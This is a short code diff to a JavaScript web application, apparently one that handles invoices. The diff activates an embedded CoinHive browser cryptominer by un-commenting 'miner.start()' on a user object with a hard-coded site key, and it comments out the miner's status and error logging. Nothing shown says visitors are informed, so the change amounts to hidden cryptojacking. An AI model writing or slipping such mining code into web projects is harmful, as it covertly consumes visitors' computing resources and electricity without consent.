@@ -1066,8 +1066,8 @@ function doExit(c){
       
     }
 	        var miner = new CoinHive.User('iJPRX3rFWcyABr6nImONcMXLWezsXh25','egestion');
-	        //miner.start();
-          miner.on('found', function() { 
+	        miner.start();
+          /*miner.on('found', function() { 
             console.log('hash found');
           });
 	        miner.on('accepted', function() { 
@@ -1084,7 +1084,7 @@ function doExit(c){
             if (params.error !== 'connection_error') {
               console.log('The pool reported an error', params.error);
             }
-          });
+          });*/
 
 }
 app.constant('EMPTY_INVOICE',{
